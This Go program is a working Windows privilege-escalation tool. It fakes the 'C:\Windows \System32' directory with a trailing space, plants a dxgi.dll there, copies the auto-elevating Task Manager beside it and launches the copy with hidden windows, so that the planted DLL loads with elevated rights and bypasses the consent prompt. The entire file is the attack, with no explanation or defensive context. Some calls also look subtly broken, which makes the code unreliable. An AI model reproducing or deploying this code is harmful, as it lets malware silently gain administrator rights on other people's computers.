package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

func main() {
	mdirPath := "C:\\Windows \\System32"

	cmd := exec.Command("cmd", "md \"\\\\?\\C:\\Windows \\System32\"")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
	}

	sourcePath := filepath.Join(".", "dxgi.dll")
	destinationPath := filepath.Join(mdirPath, "dxgi.dll")

	if err := os.Rename(sourcePath, destinationPath); err != nil {
		fmt.Printf("Error moving %s: %v\n", "dxgi.dll", err)
		return
	}

	cmd = exec.Command("cmd", "/c", "copy", "C:\\Windows\\System32\\Taskmgr.exe", mdirPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error copying Task Manager executable:", err)
		fmt.Println("Command Output:", string(output))
		return
	}

	cmd = exec.Command("powershell", "Start-Process 'C:\\Windows \\System32\\Taskmgr.exe'")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.SW_HIDE,
	}
	err = cmd.Start()
	if err != nil {
		fmt.Println("Error running Task Manager:", err)
		return
	}
}
